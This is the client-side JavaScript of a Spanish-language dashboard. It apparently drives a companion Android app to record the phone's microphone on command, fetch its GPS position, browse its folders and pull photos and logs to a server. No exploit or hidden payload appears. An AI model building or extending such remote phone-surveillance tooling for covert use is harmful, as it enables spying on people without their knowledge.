// Audio Monitor & Localizador Pro - Frontend Client Logic

let socket = null;
let reconnectTimer = null;
let currentDevices = [];
let selectedDurationSeconds = 20;
let activeRecordingTimer = null;

// Audio Player State
const audioElement = document.getElementById('global-audio-element');
let currentPlayingFile = null;

// DOM Elements
const serverWsStatus = document.getElementById('server-ws-status');
const deviceCountBadge = document.getElementById('device-count-badge');
const deviceCardContent = document.getElementById('device-card-content');
const btnStartRecord = document.getElementById('btn-start-record');
const btnRequestLocation = document.getElementById('btn-request-location');
const durationPresetBtns = document.querySelectorAll('.preset-btn');
const customDurationContainer = document.getElementById('custom-duration-container');
const customDurationInput = document.getElementById('custom-duration-input');
const recordingActiveBanner = document.getElementById('recording-active-banner');
const recordingCountdownText = document.getElementById('recording-countdown-text');
const recordingProgressFill = document.getElementById('recording-progress-fill');
const btnCancelRecording = document.getElementById('btn-cancel-recording');

// Tabs & Containers
const tabBtnRecordings = document.getElementById('tab-btn-recordings');
const tabBtnLocations = document.getElementById('tab-btn-locations');
const tabBtnFiles = document.getElementById('tab-btn-files');
const tabRecordings = document.getElementById('tab-recordings');
const tabLocations = document.getElementById('tab-locations');
const tabFiles = document.getElementById('tab-files');
const recordingsTableContainer = document.getElementById('recordings-table-container');
const locationsTableContainer = document.getElementById('locations-table-container');
const recordingsCountBadge = document.getElementById('recordings-count-badge');
const locationsCountBadge = document.getElementById('locations-count-badge');
const storedFilesCountBadge = document.getElementById('stored-files-count-badge');
const btnRefreshList = document.getElementById('btn-refresh-list');
const toastContainer = document.getElementById('toast-container');

// File Manager Elements
const fmCurrentPath = document.getElementById('fm-current-path');
const btnFmGo = document.getElementById('btn-fm-go');
const btnFmUp = document.getElementById('btn-fm-up');
const btnFmRefresh = document.getElementById('btn-fm-refresh');
const fmTreeContainer = document.getElementById('fm-tree-container');
const fmLoadingIndicator = document.getElementById('fm-loading-indicator');
const storedFilesContainer = document.getElementById('stored-files-container');
const btnRefreshStoredFiles = document.getElementById('btn-refresh-stored-files');
const shortcutButtons = document.querySelectorAll('.btn-shortcut');

// Modal Elements
const filePreviewModal = document.getElementById('file-preview-modal');
const modalFilename = document.getElementById('modal-filename');
const modalFilemeta = document.getElementById('modal-filemeta');
const modalDownloadBtn = document.getElementById('modal-download-btn');
const modalCloseBtn = document.getElementById('modal-close-btn');
const modalBodyContent = document.getElementById('modal-body-content');
const modalTypeIcon = document.getElementById('modal-type-icon');

// Conflict Modal & Queue Elements
const recordingQueueBadge = document.getElementById('recording-queue-badge');
const recordConflictModal = document.getElementById('record-conflict-modal');
const conflictModalStatus = document.getElementById('conflict-modal-status');
const btnCloseConflictModal = document.getElementById('btn-close-conflict-modal');
const btnActionQueue = document.getElementById('btn-action-queue');
const btnActionOverride = document.getElementById('btn-action-override');
const btnActionCancel = document.getElementById('btn-action-cancel');
let pendingRecordingDuration = null;

// Floating Player Elements
const floatingPlayer = document.getElementById('floating-player');
const playerTitle = document.getElementById('player-title');
const playerDate = document.getElementById('player-date');
const playerPlayPauseBtn = document.getElementById('player-play-pause-btn');
const playIcon = document.getElementById('play-icon');
const pauseIcon = document.getElementById('pause-icon');
const playerSeekSlider = document.getElementById('player-seek-slider');
const playerCurrentTime = document.getElementById('player-current-time');
const playerTotalTime = document.getElementById('player-total-time');
const playerSpeedSelect = document.getElementById('player-speed-select');
const playerDownloadBtn = document.getElementById('player-download-btn');
const playerCloseBtn = document.getElementById('player-close-btn');

// Initialize WebSockets
function connectWebSocket() {
  const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
  const wsUrl = `${protocol}//${window.location.host}/ws?type=dashboard`;

  serverWsStatus.className = 'badge badge-ws connecting';
  serverWsStatus.innerHTML = '<span class="dot"></span><span class="label">Servidor: Conectando...</span>';

  socket = new WebSocket(wsUrl);

  socket.onopen = () => {
    serverWsStatus.className = 'badge badge-ws connected';
    serverWsStatus.innerHTML = '<span class="dot"></span><span class="label">Servidor: En Línea</span>';
    if (reconnectTimer) clearTimeout(reconnectTimer);
  };

  socket.onmessage = (event) => {
    try {
      const data = JSON.parse(event.data);
      handleServerMessage(data);
    } catch (e) {
      console.error('Error parsing WS message:', e);
    }
  };

  socket.onclose = () => {
    serverWsStatus.className = 'badge badge-ws disconnected';
    serverWsStatus.innerHTML = '<span class="dot"></span><span class="label">Servidor: Desconectado</span>';
    updateDeviceStatusUI([]);
    reconnectTimer = setTimeout(connectWebSocket, 3000);
  };

  socket.onerror = (err) => {
    console.error('WS Error:', err);
    socket.close();
  };
}

// Handle incoming messages from Server
function handleServerMessage(data) {
  switch (data.type) {
    case 'INIT_STATE':
    case 'DEVICE_LIST_UPDATED':
      currentDevices = data.devices || [];
      updateDeviceStatusUI(currentDevices);
      break;

    case 'DEVICE_STATUS_UPDATE':
      const dev = currentDevices.find(d => d.id === data.deviceId);
      if (dev) {
        Object.assign(dev, data.info);
      }
      updateDeviceStatusUI(currentDevices);
      break;

    case 'RECORDING_STARTED':
      startLocalRecordingCountdown(data.durationSeconds);
      if (data.queueLength !== undefined) {
        updateQueueBadgeUI(data.queueLength);
      }
      if (data.fromQueue) {
        showToast(`🚀 Iniciando grabación encolada (${data.durationSeconds}s)`, 'info');
      }
      break;

    case 'RECORDING_QUEUED':
      showToast(`⏳ Grabación de ${data.durationSeconds}s encolada (Posición #${data.queueLength})`, 'info');
      updateQueueBadgeUI(data.queueLength);
      break;

    case 'RECORDING_CANCELLED':
      stopLocalRecordingCountdown();
      updateQueueBadgeUI(0);
      showToast('🛑 Grabación cancelada', 'info');
      break;

    case 'RECORDING_PROGRESS':
      updateRecordingProgress(data.elapsedSeconds, data.totalSeconds);
      break;

    case 'NEW_RECORDING':
      stopLocalRecordingCountdown();
      showToast(`🎙️ Nuevo audio recibido (${data.recording?.filename})`, 'success');
      fetchRecordings();
      break;

    case 'RECORDING_DELETED':
      fetchRecordings();
      break;

    case 'LOCATION_REQUESTED':
      showToast('📍 Solicitud de ubicación enviada al dispositivo...', 'info');
      break;

    case 'NEW_LOCATION_REPORT':
      showToast(`📍 Ubicación recibida de ${data.location?.deviceName || 'dispositivo'}`, 'success');
      fetchLocations();
      break;

    case 'LOCATION_DELETED':
      fetchLocations();
      break;

    case 'FILE_LIST_RECEIVED':
      fmLoadingIndicator.classList.add('hidden');
      renderLiveFileList(data.path, data.files || []);
      break;

    case 'FILE_TRANSFER_STARTED':
      showToast(`📥 Transfiriendo archivo desde el teléfono: ${data.filePath?.split('/')?.pop() || 'archivo'}...`, 'info');
      break;

    case 'REMOTE_FILE_UPLOADED':
      showToast(`✅ Archivo recibido con éxito: ${data.file?.originalName || 'archivo'}`, 'success');
      fetchStoredFiles();
      if (data.file) {
        openFilePreview(data.file);
      }
      break;

    case 'REMOTE_FILE_DELETED':
      fetchStoredFiles();
      break;

    case 'ERROR':
      fmLoadingIndicator.classList.add('hidden');
      alert(`⚠️ ${data.message}`);
      break;
  }
}

// UI: Update Connected Devices Info
function updateDeviceStatusUI(devices) {
  deviceCountBadge.textContent = `${devices.length} Conectado${devices.length === 1 ? '' : 's'}`;

  if (devices.length === 0) {
    deviceCardContent.innerHTML = `
      <div class="device-placeholder">
        <div class="pulsing-spinner"></div>
        <p>Esperando conexión del teléfono Android...</p>
        <small>Abre la app en el dispositivo e ingresa la URL del servidor</small>
      </div>
    `;
    btnStartRecord.disabled = true;
    btnRequestLocation.disabled = true;
    return;
  }

  const primaryDevice = devices[0];
  const isRecording = primaryDevice.status === 'recording' || activeRecordingTimer !== null;
  btnStartRecord.disabled = false;
  btnRequestLocation.disabled = false;

  const batteryPct = primaryDevice.battery !== null ? `${primaryDevice.battery}%` : 'N/A';
  const chargingText = primaryDevice.isCharging ? ' ⚡ (Cargando)' : '';
  const netBadge = primaryDevice.networkType === 'CELLULAR' ? '📶 Datos Móviles (4G)' : '📡 WiFi';

  deviceCardContent.innerHTML = `
    <div class="device-live-box">
      <div class="device-meta-row">
        <div>
          <div class="device-name">${escapeHtml(primaryDevice.name)}</div>
          <small style="color: var(--text-dim); font-family: var(--font-mono);">ID: ${escapeHtml(primaryDevice.id)}</small>
        </div>
        <span class="badge ${isRecording ? 'badge-ws disconnected' : 'badge-ws connected'}">
          <span class="dot"></span>
          ${isRecording ? 'Grabando...' : 'Listo / En Espera'}
        </span>
      </div>

      <div class="device-indicators">
        <div class="indicator-chip">
          <span class="icon">🔋</span>
          <span>Batería: <strong>${batteryPct}${chargingText}</strong></span>
        </div>
        <div class="indicator-chip">
          <span class="icon">🌐</span>
          <span>Red: <strong>${netBadge}</strong></span>
        </div>
      </div>
    </div>
  `;

  if (isRecording && !activeRecordingTimer) {
    const duration = primaryDevice.activeRecording?.durationSeconds || selectedDurationSeconds;
    startLocalRecordingCountdown(duration);
  }
}

// Duration Preset Click Handler
durationPresetBtns.forEach(btn => {
  btn.addEventListener('click', () => {
    durationPresetBtns.forEach(b => b.classList.remove('active'));
    btn.classList.add('active');

    const sec = btn.getAttribute('data-seconds');
    if (sec === 'custom') {
      customDurationContainer.classList.remove('hidden');
      selectedDurationSeconds = parseInt(customDurationInput.value, 10) || 45;
    } else {
      customDurationContainer.classList.add('hidden');
      selectedDurationSeconds = parseInt(sec, 10);
    }
  });
});

customDurationInput.addEventListener('input', () => {
  selectedDurationSeconds = parseInt(customDurationInput.value, 10) || 30;
});

function sendRecordCommand(durationSeconds, mode = 'queue') {
  if (currentDevices.length === 0) {
    alert('No hay ningún teléfono Android conectado.');
    return;
  }

  if (socket && socket.readyState === WebSocket.OPEN) {
    socket.send(JSON.stringify({
      action: 'record',
      durationSeconds: durationSeconds,
      mode: mode,
      deviceId: currentDevices[0]?.id
    }));
  }
}

// Start Recording Trigger (Audio + GPS)
btnStartRecord.addEventListener('click', () => {
  if (currentDevices.length === 0) {
    alert('No hay ningún teléfono Android conectado.');
    return;
  }

  // If a recording is currently running, prompt with conflict modal!
  if (activeRecordingTimer !== null) {
    pendingRecordingDuration = selectedDurationSeconds;
    conflictModalStatus.textContent = `Nueva orden de ${selectedDurationSeconds} seg`;
    recordConflictModal.classList.remove('hidden');
    return;
  }

  sendRecordCommand(selectedDurationSeconds, 'queue');
});

// Conflict Modal Actions
btnActionQueue.addEventListener('click', () => {
  recordConflictModal.classList.add('hidden');
  if (pendingRecordingDuration) {
    sendRecordCommand(pendingRecordingDuration, 'queue');
    showToast(`⏳ Grabación de ${pendingRecordingDuration}s agregada a la cola`, 'info');
  }
});

btnActionOverride.addEventListener('click', () => {
  recordConflictModal.classList.add('hidden');
  if (pendingRecordingDuration) {
    sendRecordCommand(pendingRecordingDuration, 'override');
    showToast(`⏹️ Interrumpiendo grabación para iniciar nueva (${pendingRecordingDuration}s)...`, 'info');
  }
});

btnActionCancel.addEventListener('click', () => {
  recordConflictModal.classList.add('hidden');
});

btnCloseConflictModal.addEventListener('click', () => {
  recordConflictModal.classList.add('hidden');
});

function updateQueueBadgeUI(queueLength) {
  if (!recordingQueueBadge) return;
  if (queueLength > 0) {
    recordingQueueBadge.textContent = `⏳ ${queueLength} grabación${queueLength > 1 ? 'es' : ''} pendiente${queueLength > 1 ? 's' : ''} en cola`;
    recordingQueueBadge.classList.remove('hidden');
  } else {
    recordingQueueBadge.classList.add('hidden');
  }
}

// Location Only Trigger Button (No Audio)
btnRequestLocation.addEventListener('click', () => {
  if (currentDevices.length === 0) {
    alert('No hay ningún teléfono Android conectado.');
    return;
  }

  btnRequestLocation.disabled = true;
  setTimeout(() => {
    if (currentDevices.length > 0) btnRequestLocation.disabled = false;
  }, 4000);

  if (socket && socket.readyState === WebSocket.OPEN) {
    socket.send(JSON.stringify({
      action: 'request_location',
      deviceId: currentDevices[0].id
    }));
  }
});

// Cancel Recording Trigger
btnCancelRecording.addEventListener('click', () => {
  if (confirm('¿Deseas detener la grabación y limpiar la cola?')) {
    if (socket && socket.readyState === WebSocket.OPEN) {
      socket.send(JSON.stringify({
        action: 'cancel_record',
        deviceId: currentDevices[0]?.id
      }));
    }
    stopLocalRecordingCountdown();
    updateQueueBadgeUI(0);
  }
});

// Local Visual Countdown Timer
function startLocalRecordingCountdown(totalSeconds) {
  if (activeRecordingTimer) clearInterval(activeRecordingTimer);

  recordingActiveBanner.classList.remove('hidden');
  btnStartRecord.disabled = true;

  const startTime = Date.now();
  const endTime = startTime + (totalSeconds * 1000);

  function update() {
    const now = Date.now();
    const remainingMs = Math.max(0, endTime - now);
    const elapsedSec = Math.floor((now - startTime) / 1000);
    const remainingSec = Math.ceil(remainingMs / 1000);

    const m = String(Math.floor(remainingSec / 60)).padStart(2, '0');
    const s = String(remainingSec % 60).padStart(2, '0');
    recordingCountdownText.textContent = `Grabando audio en vivo: ${m}:${s}`;

    const pct = Math.min(100, (elapsedSec / totalSeconds) * 100);
    recordingProgressFill.style.width = `${pct}%`;

    if (remainingMs <= 0) {
      recordingCountdownText.textContent = 'Subiendo archivo y ubicación al servidor...';
      clearInterval(activeRecordingTimer);
    }
  }

  update();
  activeRecordingTimer = setInterval(update, 500);
}

function stopLocalRecordingCountdown() {
  if (activeRecordingTimer) {
    clearInterval(activeRecordingTimer);
    activeRecordingTimer = null;
  }
  recordingActiveBanner.classList.add('hidden');
  if (currentDevices.length > 0) {
    btnStartRecord.disabled = false;
  }
}

function updateRecordingProgress(elapsedSeconds, totalSeconds) {
  const pct = Math.min(100, (elapsedSeconds / totalSeconds) * 100);
  recordingProgressFill.style.width = `${pct}%`;
}

// Tab Switching
function switchTab(activeTabId) {
  tabBtnRecordings.classList.toggle('active', activeTabId === 'tab-recordings');
  tabBtnLocations.classList.toggle('active', activeTabId === 'tab-locations');
  tabBtnFiles.classList.toggle('active', activeTabId === 'tab-files');

  tabRecordings.classList.toggle('hidden', activeTabId !== 'tab-recordings');
  tabLocations.classList.toggle('hidden', activeTabId !== 'tab-locations');
  tabFiles.classList.toggle('hidden', activeTabId !== 'tab-files');

  if (activeTabId === 'tab-files') {
    fetchStoredFiles();
  }
}

tabBtnRecordings.addEventListener('click', () => switchTab('tab-recordings'));
tabBtnLocations.addEventListener('click', () => switchTab('tab-locations'));
tabBtnFiles.addEventListener('click', () => switchTab('tab-files'));

// Fetch and Render Audio Recordings
async function fetchRecordings() {
  try {
    const res = await fetch('/api/recordings');
    const data = await res.json();
    renderRecordings(data);
  } catch (err) {
    console.error('Error fetching recordings:', err);
  }
}

function renderRecordings(recordings) {
  recordingsCountBadge.textContent = recordings.length;

  if (recordings.length === 0) {
    recordingsTableContainer.innerHTML = `
      <div class="empty-state">
        <p>Aún no hay grabaciones registradas.</p>
        <small>Presiona el botón de grabación para capturar el primer audio.</small>
      </div>
    `;
    return;
  }

  let html = '';
  recordings.forEach(rec => {
    const dateObj = new Date(rec.createdAt);
    const dateFormatted = dateObj.toLocaleDateString('es-ES', {
      year: 'numeric', month: 'short', day: '2-digit'
    });
    const timeFormatted = dateObj.toLocaleTimeString('es-ES', {
      hour: '2-digit', minute: '2-digit', second: '2-digit'
    });
    const sizeFormatted = (rec.size / 1024 / 1024).toFixed(2) + ' MB';
    const durationLabel = rec.durationSeconds ? formatSeconds(rec.durationSeconds) : '--';

    let locationTag = '';
    if (rec.latitude && rec.longitude) {
      const mapsUrl = rec.mapsUrl || `https://maps.google.com/?q=${rec.latitude},${rec.longitude}`;
      const acc = rec.accuracy ? ` (±${Math.round(rec.accuracy)}m)` : '';
      locationTag = `
        <a href="${mapsUrl}" target="_blank" class="location-badge-link" title="Ver ubicación exacta del cuarto de máquinas en Google Maps">
          📍 ${rec.latitude.toFixed(4)}, ${rec.longitude.toFixed(4)}${acc} ↗
        </a>
      `;
    }

    html += `
      <div class="recording-item" data-filename="${rec.filename}">
        <div class="recording-info">
          <div class="recording-icon-badge">🎙️</div>
          <div class="recording-details">
            <div class="recording-name" title="${escapeHtml(rec.filename)}">${escapeHtml(rec.filename)}</div>
            <div class="recording-meta">
              <span>📅 ${dateFormatted} ${timeFormatted}</span>
              <span class="meta-pill">⏱️ ${durationLabel}</span>
              <span class="meta-pill">💾 ${sizeFormatted}</span>
              <span class="meta-pill">📱 ${escapeHtml(rec.deviceName || 'Android')}</span>
              ${locationTag}
            </div>
          </div>
        </div>

        <div class="recording-actions">
          <button class="btn btn-play-item" onclick="playAudioTrack('${rec.filename}', '${dateFormatted} ${timeFormatted}')" title="Reproducir audio">
            <svg viewBox="0 0 24 24" fill="currentColor"><path d="M8 5v14l11-7z"/></svg>
          </button>
          <a href="/api/recordings/${rec.filename}" download="${rec.filename}" class="btn btn-icon-sm" title="Descargar archivo .m4a">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
              <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
              <polyline points="7 10 12 15 17 10"/>
              <line x1="12" y1="15" x2="12" y2="3"/>
            </svg>
          </a>
          <button class="btn btn-delete-item" onclick="deleteAudioFile('${rec.filename}')" title="Eliminar grabación">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
              <polyline points="3 6 5 6 21 6"/>
              <path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/>
            </svg>
          </button>
        </div>
      </div>
    `;
  });

  recordingsTableContainer.innerHTML = html;
}

// Fetch and Render GPS Locations
async function fetchLocations() {
  try {
    const res = await fetch('/api/locations');
    const data = await res.json();
    renderLocations(data);
  } catch (err) {
    console.error('Error fetching locations:', err);
  }
}

function renderLocations(locations) {
  locationsCountBadge.textContent = locations.length;

  if (locations.length === 0) {
    locationsTableContainer.innerHTML = `
      <div class="empty-state">
        <p>Aún no hay reportes de ubicación registrados.</p>
        <small>Presiona "Solicitar Ubicación Actual" para consultar la posición del cuarto de máquinas en tiempo real.</small>
      </div>
    `;
    return;
  }

  let html = '';
  locations.forEach(loc => {
    const dateObj = new Date(loc.createdAt);
    const dateFormatted = dateObj.toLocaleDateString('es-ES', {
      year: 'numeric', month: 'short', day: '2-digit'
    });
    const timeFormatted = dateObj.toLocaleTimeString('es-ES', {
      hour: '2-digit', minute: '2-digit', second: '2-digit'
    });

    const lat = loc.latitude ? loc.latitude.toFixed(6) : 'N/A';
    const lon = loc.longitude ? loc.longitude.toFixed(6) : 'N/A';
    const accVal = loc.accuracy ? Math.round(loc.accuracy) : 9999;
    const acc = loc.accuracy ? `±${accVal}m` : 'N/A';
    const mapsUrl = loc.mapsUrl || (loc.latitude && loc.longitude ? `https://maps.google.com/?q=${loc.latitude},${loc.longitude}` : '#');
    const prov = loc.provider || '';

    let pillClass = 'accuracy-pill-net';
    let provLabel = `📡 Red (${acc})`;
    if (accVal <= 35 || prov.toLowerCase().includes('gps')) {
      pillClass = 'accuracy-pill-gps';
      provLabel = `🎯 GPS Satelital (${acc})`;
    } else if (prov.toLowerCase().includes('ip') || accVal >= 1000) {
      pillClass = 'accuracy-pill-ip';
      provLabel = `⚠️ Aprox. IP (~5km)`;
    }

    html += `
      <div class="location-item" data-id="${loc.id}">
        <div class="recording-info">
          <div class="location-icon-badge">📍</div>
          <div class="recording-details">
            <div class="recording-name">${escapeHtml(loc.deviceName || 'Teléfono')} <span style="font-weight: 400; color: var(--text-dim); font-size: 0.85rem;">(${escapeHtml(loc.deviceId)})</span></div>
            <div class="recording-meta">
              <span>📅 ${dateFormatted} ${timeFormatted}</span>
              <span class="meta-pill" style="color: #38bdf8;">🌐 ${lat}, ${lon}</span>
              <span class="meta-pill ${pillClass}">${provLabel}</span>
              ${loc.city ? `<span class="meta-pill">🏙️ ${escapeHtml(loc.city)}</span>` : ''}
              ${loc.battery !== null ? `<span class="meta-pill">🔋 ${loc.battery}%</span>` : ''}
            </div>
          </div>
        </div>

        <div class="recording-actions">
          ${loc.latitude && loc.longitude ? `
            <a href="${mapsUrl}" target="_blank" class="btn-map-link" title="Abrir ubicación en Google Maps">
              <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2">
                <path d="M12 2a8 8 0 0 0-8 8c0 5.25 8 12 8 12s8-6.75 8-12a8 8 0 0 0-8-8z"/>
                <circle cx="12" cy="10" r="3"/>
              </svg>
              <span>Ver Mapa ↗</span>
            </a>
          ` : '<span style="color: var(--accent-red); font-size: 0.8rem;">Sin señal GPS</span>'}

          <button class="btn btn-delete-item" onclick="deleteLocationRecord('${loc.id}')" title="Eliminar registro de ubicación">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
              <polyline points="3 6 5 6 21 6"/>
              <path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/>
            </svg>
          </button>
        </div>
      </div>
    `;
  });

  locationsTableContainer.innerHTML = html;
}

window.deleteLocationRecord = async function(id) {
  if (!confirm('¿Deseas eliminar este registro de ubicación?')) return;

  try {
    const res = await fetch(`/api/locations/${id}`, { method: 'DELETE' });
    if (res.ok) {
      fetchLocations();
    }
  } catch (err) {
    alert('Error al eliminar registro');
  }
};

// Global Audio Player Management
window.playAudioTrack = function(filename, dateStr) {
  currentPlayingFile = filename;
  playerTitle.textContent = filename;
  playerDate.textContent = dateStr;
  playerDownloadBtn.href = `/api/recordings/${filename}`;
  playerDownloadBtn.download = filename;

  audioElement.src = `/api/recordings/${filename}`;
  audioElement.playbackRate = parseFloat(playerSpeedSelect.value);
  audioElement.play();

  floatingPlayer.classList.remove('hidden');
  playIcon.classList.add('hidden');
  pauseIcon.classList.remove('hidden');
};

window.deleteAudioFile = async function(filename) {
  if (!confirm(`¿Estás seguro de eliminar "${filename}"?`)) return;

  try {
    const res = await fetch(`/api/recordings/${filename}`, { method: 'DELETE' });
    if (res.ok) {
      if (currentPlayingFile === filename) {
        audioElement.pause();
        floatingPlayer.classList.add('hidden');
      }
      fetchRecordings();
    }
  } catch (err) {
    alert('Error al eliminar el archivo');
  }
};

playerPlayPauseBtn.addEventListener('click', () => {
  if (audioElement.paused) {
    audioElement.play();
  } else {
    audioElement.pause();
  }
});

audioElement.addEventListener('play', () => {
  playIcon.classList.add('hidden');
  pauseIcon.classList.remove('hidden');
});

audioElement.addEventListener('pause', () => {
  playIcon.classList.remove('hidden');
  pauseIcon.classList.add('hidden');
});

audioElement.addEventListener('timeupdate', () => {
  const cur = audioElement.currentTime || 0;
  const dur = audioElement.duration || 0;

  playerCurrentTime.textContent = formatSeconds(Math.floor(cur));
  playerTotalTime.textContent = isNaN(dur) ? '--:--' : formatSeconds(Math.floor(dur));

  if (dur > 0) {
    playerSeekSlider.value = (cur / dur) * 100;
  }
});

playerSeekSlider.addEventListener('input', () => {
  const dur = audioElement.duration;
  if (dur) {
    audioElement.currentTime = (playerSeekSlider.value / 100) * dur;
  }
});

playerSpeedSelect.addEventListener('change', () => {
  audioElement.playbackRate = parseFloat(playerSpeedSelect.value);
});

playerCloseBtn.addEventListener('click', () => {
  audioElement.pause();
  floatingPlayer.classList.add('hidden');
});

btnRefreshList.addEventListener('click', () => {
  fetchRecordings();
  fetchLocations();
  fetchStoredFiles();
});

// ==========================================================================
// Remote File Explorer Logic
// ==========================================================================

// Request live folder list from connected Android device
function requestLiveFileList(path) {
  if (currentDevices.length === 0) {
    alert('No hay ningún teléfono conectado para consultar archivos.');
    return;
  }

  fmLoadingIndicator.classList.remove('hidden');
  fmTreeContainer.innerHTML = `
    <div class="empty-state">
      <div class="pulsing-spinner"></div>
      <p>Cargando lista de archivos desde el teléfono...</p>
    </div>
  `;

  if (socket && socket.readyState === WebSocket.OPEN) {
    socket.send(JSON.stringify({
      action: 'list_files',
      deviceId: currentDevices[0]?.id,
      path: path || ''
    }));
  }
}

// Request phone to transfer a specific file to the server
function requestFileTransfer(filePath) {
  if (currentDevices.length === 0) {
    alert('No hay dispositivo conectado para transferir el archivo.');
    return;
  }

  showToast(`Solicitando "${filePath.split('/').pop()}" al dispositivo...`, 'info');

  if (socket && socket.readyState === WebSocket.OPEN) {
    socket.send(JSON.stringify({
      action: 'fetch_file',
      deviceId: currentDevices[0]?.id,
      filePath: filePath
    }));
  }
}

// Render Live Directory Items from Phone
function renderLiveFileList(currentPath, files) {
  fmCurrentPath.value = currentPath || '';

  if (!files || files.length === 0) {
    fmTreeContainer.innerHTML = `
      <div class="empty-state">
        <p>Carpeta vacía o sin archivos accesibles en esta ruta.</p>
        <small>Ruta: ${escapeHtml(currentPath)}</small>
      </div>
    `;
    return;
  }

  let html = '';
  files.forEach(f => {
    const isDir = f.isDirectory;
    const defaultIcon = isDir ? '📁' : getFileIcon(f.name);
    const iconHtml = f.thumbnailBase64 
      ? `<img class="fm-thumb-preview" src="data:image/jpeg;base64,${f.thumbnailBase64}" alt="${escapeHtml(f.name)}" title="Miniatura previa (Click para solicitar descarga)" onclick="requestFileTransfer('${escapeJsString(f.path)}')" />`
      : defaultIcon;
    const sizeStr = isDir ? 'Carpeta' : formatBytes(f.size || 0);
    const dateStr = f.lastModified ? new Date(f.lastModified).toLocaleString('es-ES') : '';

    html += `
      <div class="fm-item-row">
        <div class="fm-item-left">
          <span class="fm-item-icon">${iconHtml}</span>
          <div class="fm-item-info">
            <div class="fm-item-name ${isDir ? 'dir-name' : ''}" 
                 onclick="${isDir ? `browseToPath('${escapeJsString(f.path)}')` : ''}"
                 title="${escapeHtml(f.path)}">
              ${escapeHtml(f.name)}
            </div>
            <div class="fm-item-meta">${sizeStr} • ${dateStr}</div>
          </div>
        </div>
        <div class="fm-item-actions">
          ${isDir ? `
            <button class="btn btn-secondary-sm" onclick="browseToPath('${escapeJsString(f.path)}')">Abrir ➔</button>
          ` : `
            <button class="btn btn-fetch-file" onclick="requestFileTransfer('${escapeJsString(f.path)}')">
              📥 Solicitar y Ver
            </button>
          `}
        </div>
      </div>
    `;
  });

  fmTreeContainer.innerHTML = html;
}

window.browseToPath = function(path) {
  fmCurrentPath.value = path;
  requestLiveFileList(path);
};

// Path navigation buttons
btnFmGo.addEventListener('click', () => {
  requestLiveFileList(fmCurrentPath.value.trim());
});

fmCurrentPath.addEventListener('keydown', (e) => {
  if (e.key === 'Enter') {
    requestLiveFileList(fmCurrentPath.value.trim());
  }
});

btnFmRefresh.addEventListener('click', () => {
  requestLiveFileList(fmCurrentPath.value.trim());
});

btnFmUp.addEventListener('click', () => {
  let cur = fmCurrentPath.value.trim();
  if (cur === 'camera' || cur === 'logs' || cur === 'internal' || cur === 'root' || cur === '/' || cur === '/sdcard') {
    requestLiveFileList('internal');
    return;
  }
  const parts = cur.replace(/\/$/, '').split('/');
  if (parts.length > 1) {
    parts.pop();
    const upPath = parts.join('/') || '/';
    fmCurrentPath.value = upPath;
    requestLiveFileList(upPath);
  }
});

shortcutButtons.forEach(btn => {
  btn.addEventListener('click', () => {
    const p = btn.getAttribute('data-path');
    fmCurrentPath.value = p;
    requestLiveFileList(p);
  });
});

// ==========================================================================
// Stored / Downloaded Files on Server Logic
// ==========================================================================

async function fetchStoredFiles() {
  try {
    const res = await fetch('/api/files/stored');
    const files = await res.json();
    renderStoredFiles(files);
  } catch (err) {
    console.error('Error fetching stored files:', err);
  }
}

function renderStoredFiles(files) {
  storedFilesCountBadge.textContent = files.length;

  if (files.length === 0) {
    storedFilesContainer.innerHTML = `
      <div class="empty-state-sm">
        <p>Aún no hay archivos descargados en el servidor.</p>
        <small>Navega en las carpetas arriba y haz clic en "📥 Solicitar y Ver" para descargar fotos de la cámara o logs.</small>
      </div>
    `;
    return;
  }

  let html = '';
  files.forEach(f => {
    const isImage = f.isImage || /\.(jpg|jpeg|png|webp|gif)$/i.test(f.filename);
    const icon = isImage ? '🖼️' : getFileIcon(f.originalName);
    const sizeStr = formatBytes(f.size || 0);
    const dateStr = f.createdAt ? new Date(f.createdAt).toLocaleString('es-ES') : '';

    html += `
      <div class="fm-item-row">
        <div class="fm-item-left">
          <span class="fm-item-icon">${icon}</span>
          <div class="fm-item-info">
            <div class="fm-item-name" title="${escapeHtml(f.originalName)}">
              ${escapeHtml(f.originalName)}
            </div>
            <div class="fm-item-meta">${sizeStr} • ${dateStr} • Dispositivo: ${escapeHtml(f.deviceName || 'Android')}</div>
          </div>
        </div>
        <div class="fm-item-actions">
          <button class="btn btn-secondary-sm" onclick='openFilePreview(${JSON.stringify(f)})'>
            👁️ Ver
          </button>
          <a href="/api/files/download/${f.filename}" download="${f.originalName}" class="btn btn-icon-sm" title="Descargar archivo">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
              <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
              <polyline points="7 10 12 15 17 10"/>
              <line x1="12" y1="15" x2="12" y2="3"/>
            </svg>
          </a>
          <button class="btn btn-delete-item" onclick="deleteStoredFile('${f.id}')" title="Eliminar archivo del servidor">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
              <polyline points="3 6 5 6 21 6"/>
              <path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/>
            </svg>
          </button>
        </div>
      </div>
    `;
  });

  storedFilesContainer.innerHTML = html;
}

btnRefreshStoredFiles.addEventListener('click', fetchStoredFiles);

window.deleteStoredFile = async function(id) {
  if (!confirm('¿Deseas eliminar este archivo descargado del servidor?')) return;

  try {
    const res = await fetch(`/api/files/${id}`, { method: 'DELETE' });
    if (res.ok) {
      fetchStoredFiles();
    }
  } catch (err) {
    alert('Error al eliminar el archivo');
  }
};

// ==========================================================================
// Preview Modal for Remote Photos & Logs
// ==========================================================================

window.openFilePreview = async function(file) {
  modalFilename.textContent = file.originalName || file.filename;
  const sizeStr = formatBytes(file.size || 0);
